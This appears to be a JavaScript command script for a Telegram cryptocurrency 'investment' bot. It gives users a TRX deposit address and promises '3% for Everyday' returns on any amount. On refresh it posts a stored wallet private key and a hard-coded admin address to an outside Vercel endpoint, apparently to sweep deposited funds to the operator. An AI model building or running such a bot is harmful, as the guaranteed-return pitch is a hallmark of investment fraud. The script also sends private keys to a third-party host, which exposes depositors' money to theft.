/*CMD
  command: Demode
  help: 
  need_reply: false
  auto_retry_time: 
  folder: 

  <<ANSWER

  ANSWER

  <<KEYBOARD

  KEYBOARD
  aliases: 
CMD*/

if (request.data) {
  var message_id = request.message.message_id
  var chat_id = request.message.chat.id

  Api.deleteMessage({
    chat_id: chat_id,
    message_id: message_id
  })
}
var c = Bot.getProperty("currency")
var io = Bot.getProperty("dem")

var dear = Bot.getProperty("adura"+user.telegramid)
if (dear == undefined) {
  Bot.sendMessage("✋️*Hold on..... generating your Deposit address...*")
HTTP.get({
url:
    "https://tronb2.vercel.app",
  success: "getfirstusa"})
} else {
if (params == "r") {
var w = Bot.getProperty("aduras"+user.telegramid)

var addre = "TBYhyFYU6gszd9h5UBGAi9LWFJgntw7cdT"
HTTP.post( {
    url: "https://tronb2.vercel.app/easytrx",
    success: '/onIncomeTRX',
    body: {private_key: w,Admin_tron_address:addre}
})
return }


var state = Bot.getProperty("Deps")
if (state=="🛑 Turned OFF"){
Bot.sendMessage("*⛔️ Deposit System is OFF* ")
return
}
var U = Bot.getProperty("Mindepo","⛔️ Not set")

var button = [[{title:"🔃 Refresh Deposit", command:"Demode r"}]]
Bot.sendInlineKeyboard(button,"_🐸 Welcome_ *" +user.first_name+ "* _! Here you can start a new investment!_\n\n*🐸 We offer best Investment best for you!\n\n 🐸minimum 1-Unlimited TRX\n 🐸 3% for Everyday day\n 🐸3.00% every 24 hours*\n 🐸 Paid on Every 24 hours\n\n⚠️ *If you send less than* `"+U+"` *TRX*, _your deposit will be igonred!✅ Send the amount you want to deposit to the following address_\n\n`"+dear+"`"
)



 }
